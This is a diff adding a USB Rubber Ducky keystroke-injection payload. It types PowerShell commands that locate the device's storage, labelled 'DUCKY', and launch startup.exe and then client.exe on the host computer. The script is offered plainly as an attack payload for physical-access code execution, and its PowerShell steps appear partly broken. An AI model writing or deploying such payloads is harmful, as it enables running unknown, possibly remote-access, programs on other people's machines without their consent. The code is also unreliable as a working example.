@@ -1,0 +1,14 @@
+DELAY 2000
+REM This payload opens the Rubber Ducky's storage and double-clicks the startup.exe file
+DELAY 500
+STRING powershell $wshShell = New-Object -ComObject WScript.Shell; $wshShell.SendKeys('^{ESC}')
+ENTER
+DELAY 500
+STRING powershell $wshShell = New-Object -ComObject WScript.Shell; $wshShell.SendKeys('r')
+ENTER
+DELAY 500
+STRING powershell $usbPath = Get-WMIObject Win32_Volume -Filter "Label='DUCKY'" | Select-Object -ExpandProperty DriveLetter; Start-Process ($usbPath + '\startup.exe')
+ENTER
+DELAY 500
+STRING powershell $usbPath = Get-WMIObject Win32_Volume -Filter "Label='DUCKY'" | Select-Object -ExpandProperty DriveLetter; Start-Process ($usbPath + '\client.exe')
+ENTER
